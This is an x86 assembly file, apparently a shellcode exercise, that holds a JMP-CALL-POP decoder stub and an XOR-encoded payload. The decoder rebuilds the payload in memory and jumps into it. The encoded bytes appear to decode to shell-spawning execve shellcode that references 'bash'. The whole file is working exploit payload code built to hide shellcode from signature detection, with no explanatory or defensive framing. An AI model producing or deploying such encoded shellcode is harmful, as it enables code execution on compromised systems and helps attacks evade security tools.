
global _start

section .text

_start:
	jmp short call_shellcode
	
decoder:
	;esi is base of shellcode array
	pop esi	
	;let ecx be index for where to place read byte
	xor ecx, ecx
	;edx is the index for read byte
	xor edx, edx
	;eax used for short time saving of read byte
	xor eax, eax
decode:
	;Read instruction byte
	mov al, byte [esi+edx]
	;Read byte to xor with
	inc dl
	xor al, byte[esi+edx]
	;increment counter for read byte
	inc dl

	;Write byte in correct location and increment counter
	mov [esi+ecx], al 
	inc ecx
	
	;While edx<shellcodelength, go for loop
	cmp edx, ShellcodeLength
	jb decode
	
	jmp short EncodedShellcode

call_shellcode:
	call decoder

EncodedShellcode: db 0xde,0xef,0x3b,0xfb,0x43,0x13,0x63,0x0b,0xef,0x8d,0x01,0x60,0xf5,0x86,0xb6,0xde,0xe7,0x8f,0x82,0xad,0x17,0x38,0xab,0x84,0x24,0x0b,0xb1,0xd9,0x6c,0x43,0x20,0x42,0x6d,0x04,0x72,0x1c,0xea,0x63,0xc9,0x2a,0xb4,0xe4,0xd6,0x5f,0x43,0xa1,0xf9,0xaa,0xcf,0x46,0x77,0x96,0x75,0xc5,0x57,0x5c,0x81,0x4c,0x4e,0xce 
ShellcodeLength equ $-EncodedShellcode
